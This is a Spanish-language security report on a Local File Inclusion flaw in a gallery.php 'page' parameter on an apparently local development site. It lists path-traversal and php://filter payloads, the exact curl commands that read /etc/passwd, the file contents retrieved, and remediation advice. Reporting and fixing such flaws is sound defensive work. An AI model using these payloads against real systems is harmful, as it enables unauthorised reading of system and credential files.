# Informe de LFI - Galería de Arte Virtual

Fecha: 2026-04-18T12:50:34.693226 UTC
Objetivo: http://web.dev.local:8081

Resumen:
- Vulnerabilidad: Local File Inclusion (LFI) en gallery.php?page
- Confirmación: Se logró leer /etc/passwd mediante traversal

Detalles técnicos:
- Parámetro vulnerable: page en /gallery.php
- Payloads usados:
  - ../../etc/passwd
  - ../../../etc/passwd
  - ../../../../etc/passwd
  - ../../../../../../etc/passwd
  - php://filter/read=convert.base64-encode/resource=/etc/passwd

Comandos exactos ejecutados (resumen):
- curl 'http://web.dev.local:8081/gallery.php?page=../../etc/passwd'
- curl 'http://web.dev.local:8081/gallery.php?page=../../../etc/passwd'
- curl 'http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd'
- curl 'http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd'
- curl 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd'

Impacto:
- Se leyó con éxito /etc/passwd (información de usuarios local) -> indica acceso a ficheros del sistema mediante LFI.

Recomendaciones:
- Validar y sanear parámetros que incluyan rutas de ficheros.
- Usar listas blancas de ficheros permitidos.
- Evitar incluir archivos directamente desde parámetros; usar mapeo interno.
- Deshabilitar wrappers peligrosos y limitar permisos del usuario del servidor.

Evidencia (fragmento de /etc/passwd leído):
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```
